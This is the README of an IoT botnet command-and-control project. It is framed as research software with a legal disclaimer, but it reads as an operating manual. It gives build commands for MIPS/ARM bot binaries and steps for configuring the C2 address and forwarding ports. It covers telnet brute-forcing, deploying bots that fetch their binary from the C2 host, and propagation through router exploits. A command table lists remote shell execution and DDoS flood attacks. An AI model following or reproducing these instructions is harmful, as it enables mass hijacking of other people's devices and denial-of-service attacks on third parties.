<div align="center">
<h1>⚠ DISCONTINUED PROJECT</h1>
<h2>This project is not in proper working order. It is unfinished, experimental, and may fail at any point. Use at your own risk.</h2>
<h3>No support will be provided. Read the README fully before doing anything.</h3>
</div>

# Joker IoT Botnet C2

> **WARNING: This is research/educational software. Do not deploy against systems you do not own. Unauthorized access is illegal.**

A C2 (Command & Control) infrastructure for an IoT botnet with:
- A **lightweight C bot** (primary payload, ~900KB MIPS/ARM binaries)
- A **Go bot** (fallback, ~4MB binaries)
- A **scanner** for finding vulnerable IoT devices
- A **bruteforcer** for telnet credential testing
- A **deployer** tool for installing bots on discovered devices
- A **telnet-based command console** (via PuTTY, port 6667)

Tip: Find your public IP with curl ifconfig.me on your VPS. config.json is the primary source — deployer.py and bruteforce.py read from it automatically, but update their hardcoded fallbacks too for safety. The bot binaries (agent.c/agent.go) have the IP compiled in at build time, so rebuild them after changing.
you can either use your home public ip or a vps either will work it is recomended to use a vps.

64.4 t/s

---

## Project Structure

```
.
├── main.py                          # Entry point: C2 server + telnet console (port 9001 + 6667)
├── src/config.json                  # Network configuration (ports, host addresses)
├── requirements.txt                 # Python dependencies
├── AGENTS.md                        # Build instructions for Go/C bots
├── README.md                        # This file
|
├── core/
│   ├── iot_agent/
│   │   ├── server.py                # C2Server: JSON protocol + HTTP bot binary serving (port 9001)
│   │   ├── explosives.py            # Attack animation helpers
│   │   └── agents.json              # Registered bots (reset to {} on startup, auto-populated)
│   ├── bot/
│   │   ├── agent.c                  # C bot source (primary, ~900KB MIPS/ARM binaries)
│   │   ├── agent.go                 # Go bot source (fallback, ~4MB binaries)
│   │   ├── rawfd_unix.go            # Build-constrained raw socket code (Unix)
│   │   ├── rawfd_windows.go         # Build-constrained raw socket code (Windows)
│   │   ├── go.mod
│   │   └── build-*.bat              # Windows build scripts
│   └── ddos_attack/                 # Legacy/DDoS modules (not core)
|
└── BOT SCANNING-LOADING/
    ├── scanner/
    │   ├── fast_scanner.go          # Go-based port scanner with subnet hitlists
    │   ├── go.mod
    │   └── go.sum
    ├── bruteforce/
    │   ├── bruteforce.py            # Telnet credential bruteforcer
    │   ├── wordlist.txt             # Credential wordlist
    │   ├── ip-list.txt              # Target IP list
    │   └── hits.txt                 # Bruteforce results (output)
    └── infector/
        ├── deployer.py              # Bot deployment tool
        ├── scan_results.txt         # Scanner results (input for deployer)
        └── deployed.txt             # Deployment tracking (output)
```

---

## Prerequisites

### Python 3.x
```bash
pip install -r requirements.txt
```

Dependencies: `colorama`, `requests`, `rich`

### C Bot Cross-Compilation (from WSL2/Ubuntu)
```bash
sudo apt-get install gcc-mipsel-linux-gnu gcc-mips-linux-gnu \
    gcc-arm-linux-gnueabihf gcc-aarch64-linux-gnu
```

### Go 1.20+ (for Go bots and scanner)
```bash
go install golang.org/x/sys/unix@latest  # optional, for raw sockets
go install github.com/google/gopacket@latest  # for scanner raw sockets
```

---

## Building Bot Binaries

> **IMPORTANT**: Compiled binaries are NOT included in this repo. You MUST build them yourself.

### C Bots (Primary Payload — Recommended)

C bots are ~900KB (MIPS/ARM) vs ~4MB Go binaries. Build from WSL2/Ubuntu:

```bash
cd core/bot

# MIPS little-endian (most common IoT routers)
mipsel-linux-gnu-gcc -Os -s -static -o bot-mipsle agent.c -lpthread

# MIPS big-endian
mips-linux-gnu-gcc -Os -s -static -o bot-mips agent.c -lpthread

# ARM (32-bit IoT)
arm-linux-gnueabihf-gcc -Os -s -static -o bot-arm agent.c -lpthread

# ARM64 (64-bit IoT)
aarch64-linux-gnu-gcc -Os -s -static -o bot-arm64-c agent.c -lpthread
```

**Windows test build** (MSYS2 MinGW — for local testing only):
```bash
gcc -Os -s -o bot-amd64.exe agent.c -lws2_32
```

### Go Bots (Fallback — use if C cross-compiler unavailable)

```bash
cd core/bot
export CGO_ENABLED=0

GOOS=linux GOARCH=mipsle go build -ldflags "-s -w" -o bot-mipsle .
GOOS=linux GOARCH=mips go build -ldflags "-s -w" -o bot-mips .
GOOS=linux GOARCH=arm go build -ldflags "-s -w" -o bot-arm .
GOOS=linux GOARCH=arm64 go build -ldflags "-s -w" -o bot-arm64 .
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o bot-amd64 .
```

### Scanner Binary

```bash
cd BOT\ SCANNING-LOADING/scanner
GOOS=linux GOARCH=amd64 go build -o fast_scanner .
```

### Where to Put Built Binaries

Place all built bot binaries in `core/bot/`. The C2 server serves them via HTTP. Required filenames:

| File | Architecture | Type |
|------|-------------|------|
| `bot-mipsle` | MIPS little-endian | C (preferred) |
| `bot-mips` | MIPS big-endian | C (preferred) |
| `bot-arm` | ARM 32-bit | C (preferred) |
| `bot-arm64` | ARM 64-bit | Go fallback |
| `bot-amd64` | x86_64 | Go fallback |

The server auto-selects: if you request `/agent/mipsle`, it tries `bot-mipsle` first. If not found, it falls back to other available binaries. Unknown architectures default to `bot-mipsle`.

---

## Setup

### 1. Configure C2 Address

**This is the most critical step.** Edit `src/config.json`:

```json
{
    "listen_host": "0.0.0.0",
    "listen_port": 6667,      // Telnet console port — set to 0.0.0.0 to listen on all interfaces
    "public_host": "YOUR_PUBLIC_IP",  // *** CHANGE THIS TO YOUR VPS PUBLIC IP ***
    "public_port": 9001,      // C2 agent + HTTP binary port
    "agent_c2_port": 9001,
    "scan_listen_port": 9002
}
```

> **Important**: `public_host` MUST be set to your actual public IP address. If you leave it as `0.0.0.0`, bots will NOT be able to connect to you. You can find your public IP by visiting https://whatismyip.akamai.com or running `curl ifconfig.me` on your VPS.

The same config is also hardcoded as defaults in:
- `core/bot/agent.c` → `#define DEFAULT_C2_HOST`
- `core/bot/agent.go` → `DEFAULT_C2_HOST const`
- `BOT SCANNING-LOADING/infector/deployer.py` → `C2_HOST` variable
- `BOT SCANNING-LOADING/brute forcer/bruteforce.py` → `C2_HOST` variable

Update all of these to match your public IP.

### 2. Port Forwarding

Your C2 server must be reachable from the internet. If you're using a VPS, skip the firewall step. If behind NAT (home router), forward these ports:

**Required ports:**
| Port | Protocol | Purpose |
|------|----------|---------|
| 9001 | TCP | C2 agent connections + HTTP binary downloads |
| 6667 | TCP | Telnet console (for PuTTY command input) |
| 23 | TCP | Inbound scanning (telnet on IoT devices) |
| 2323 | TCP | Backup telnet port for newer IoT devices |

**On Linux VPS** (if firewall is enabled):
```bash
# UFW
sudo ufw allow 9001/tcp
sudo ufw allow 6667/tcp
sudo ufw allow 23/tcp
sudo ufw allow 2323/tcp

# iptables
sudo iptables -A INPUT -p tcp --dport 9001 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 6667 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 23 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 2323 -j ACCEPT
```

**If behind NAT** (home router), you need to:
1. Find your router's admin panel (usually `192.168.1.1` or `192.168.0.1`)
2. Navigate to "Port Forwarding" or "Virtual Server"
3. Add rules forwarding TCP 9001, 6667, 23, 2323 to your machine's local IP
4. Note: Many ISPs block port 23 on residential connections

### 3. Start the C2 Server

```bash
python main.py
```

This starts:
- **C2 Server** on `0.0.0.0:9001` (JSON protocol + HTTP binary serving)
- **Telnet Console** on `0.0.0.0:6667` (command input via PuTTY)

You should see a banner with the bot count and command prompt.

---

## Usage

### Connecting via PuTTY (Telnet Console)

1. Open PuTTY
2. Host Name (or IP): `your.vps.ip.address`
3. Port: `6667`
4. Connection type: `Telnet`
5. Click "Open"

You will see the command console with a list of connected bots.

### Console Commands (in PuTTY)

| Command | Description |
|---------|-------------|
| `BOTS` | List all connected bots with IP, arch, platform |
| `STATUS` | Show server status and bot count |
| `<cmd> ALL` | Broadcast command to all bots (e.g., `stop ALL`) |
| `<cmd> <bot_id>` | Send command to a specific bot |
| `exit` | Disconnect PuTTY |

### Bot Commands (JSON protocol — sent by C2)

| Command | Description | Example |
|---------|-------------|---------|
| `ping` | Bot responds with pong (alive check) | `ping ALL` |
| `stop` | Stop all active attacks | `stop ALL` |
| `sysinfo` | Bot sends system information | `sysinfo ALL` |
| `propagate` | Bot starts the scanner propagation loop | `propagate ALL` |
| `exec <cmd>` | Execute shell command on bot | `exec whoami ALL` |
| `flood <ip> <port> <time> <type>` | Launch DDoS attack | `flood 1.1.1.1 80 300 udp ALL` |
| `ssleep <secs>` | Bot sleeps for N seconds | `ssleep 60 ALL` |

Attack types: `udp`, `tcp`, `http`, `gport`, `tcpall`, `pcron`

### Bot Installation (on target device)

After finding vulnerable devices, use the deployer:

```bash
cd "BOT SCANNING-LOADING/infector"
python deployer.py
```

The deployer will:
1. Ask for C2 address (default from `src/config.json`)
2. If C2 not running, offer to start it automatically
3. Ask for thread count (default 250)
4. Connect to each target in `scan_results.txt`
5. Download the appropriate architecture binary from `http://<c2_host>:9001/agent/<arch>`
6. Install and start the bot

**Requirements**: `scan_results.txt` must exist in the infector directory with lines in format `ip:port` or `ip:port:user:pass`.

---

## Workflow Overview

```
1. Build bot binaries (C cross-compile via WSL2)
   → core/bot/bot-mipsle, bot-mips, bot-arm, etc.

2. Configure src/config.json with your public IP

3. Start C2 server
   → python main.py
   → Listens on port 9001 (C2 + HTTP) and 6667 (telnet)

4. Scan for vulnerable devices (optional)
   → Run scanner, output to scan_results.txt

5. Brute-force telnet credentials (optional)
   → python bruteforce.py
   → Output to hits.txt

6. Deploy bots to discovered devices
   → python deployer.py
   → Downloads from http://<c2>:9001/agent/<arch>

7. Control bots via PuTTY (telnet port 6667)
   → Issue ATTACK, PROPAGATE, STOP commands
```

---

## Architecture Details

### C Bot (`core/bot/agent.c`)

- **Protocol**: JSON over TCP, newline-terminated
  - Register: `{"type": "register", "agent_id": "...", "hostname": "...", "ip": "...", "platform": "linux", "arch": "mipsle", "version": "3.0.0"}`
  - Heartbeat: Server sends `{"type": "heartbeat"}`, bot responds `{"type": "pong"}`

- **Propagation Scanner**: 3 scout threads + 40 worker threads
  - Scouts use non-blocking async TCP connect with `select()`/`getsockopt(SO_ERROR)`
  - Workers block on `pthread_cond_wait` until scouts find open ports
  - Shared mutex-protected linked-list queue of IP:port targets
  - IP generation: 70% subnet-prioritized (high-density IoT /16s), 30% random
  - Bogon filtering (10.x, 172.16-31.x, 192.168.x, multicast, etc.)
  - Telnet brute-force on ports 23/2323
  - Web exploits: thinkphp, huawei, gpon80, hnap, zyxel
  - Downloads itself from `/agent/{arch}` and executes

- **Attacks**: UDP/TCP floods, HTTP floods, GTP floods, RUDY, etc.

### Go Bot (`core/bot/agent.go`)

- Same JSON protocol and command set as C bot
- Larger binary (~4MB stripped) but easier to cross-compile (no C library needed)
- Raw socket scanner if privileges available, TCP connect scanner as fallback
- Uses Go's `runtime.GOARCH` for architecture detection (fixed from `os.Getenv("GOARCH")`)

### C2 Server (`core/iot_agent/server.py`)

- Listens on port 9001, handles both JSON protocol and HTTP
- **JSON protocol** (port 9001):
  - Bot → Server: `{"type": "register", ...}` on connect
  - Server → Bot: `{"type": "heartbeat"}` periodically
  - Bot → Server: `{"type": "pong"}` in response
  - Server → Bot: `{"type": "command", "cmd": "..."}` to issue commands
- **HTTP serving** (same port 9001):
  - GET `/agent/<arch>` returns the appropriate bot binary
  - Architecture mapping handles common aliases (mipsel→mipsle, amd64→amd64, etc.)
  - Falls back to `bot-mipsle` if architecture is unknown/unavailable

---

## Known Issues & Unfinished Features

This project is **NOT production-ready**. Multiple components are incomplete, untested, or broken:

1. **Not all architectures cross-compiled**: You must build binaries yourself. Missing binaries = bots that can't download themselves.

2. **C2 server not auto-started**: `main.py` does NOT auto-start the C2 server. Run `python main.py` first, THEN run `deployer.py`.

3. **Bots connect OUTBOUND to C2**: Bots must be able to reach your port 9001. If `public_host` is wrong or port isn't forwarded, bots will fail to connect silently.

4. **No bot persistence**: Bots do not automatically reconnect or persist. If the C2 restarts, bots must be re-installed.

5. **Scanner requires root/sudo**: `fast_scanner.go` uses raw packets via `gopacket/pcap`, which requires root on Linux. TCP connect scan mode is available as fallback but much slower.

6. **Bruteforcer credentials**: `bruteforce.py` uses `wordlist.txt`. The quality and completeness of this wordlist affects success rates.

7. **Agent architecture detection**: The C bot detects its own architecture from the compiled binary filename, not at runtime. Ensure you deploy the correct binary for each target.

8. **Windows compatibility**: The C bot can compile on Windows, but IoT targeting is Linux-only. Use WSL2 for cross-compilation to MIPS/ARM.

9. **Persistence is basic**: Cron-based persistence via `/etc/cron.d/` — may fail on read-only filesystems or devices without cron.

10. **Protocol is plaintext JSON**: No encryption, compression, or obfuscation. Traffic can be intercepted and analyzed.

11. **Error handling is minimal**: Bots may silently drop connections. Reconnection logic is basic. Restart bots if they stop responding.

12. **Test binaries**: Any `bot-test*.exe` files in `core/bot/` are Windows test builds. These may fail to delete due to file locks if still in use.

13. **ARM64 C bot not cross-compiled by default**: The `aarch64-linux-gnu-gcc` toolchain is often not installed. The Go fallback `bot-arm64` (~3.4MB) is used instead.

14. **Deployer requires scan_results.txt**: The deployer reads from `scan_results.txt` in the infector directory. Without this file, the deployer has no targets to deploy to.

---

## Security Notice

This software is designed for security research and educational purposes only. By using this software, you agree:
- You will only use it on systems you own or have explicit permission to test
- You understand that unauthorized network access is a criminal offense in most jurisdictions
- You will not hold the authors liable for any damage, legal issues, or misuse

**The authors are not responsible for any damage or legal issues caused by this software.**
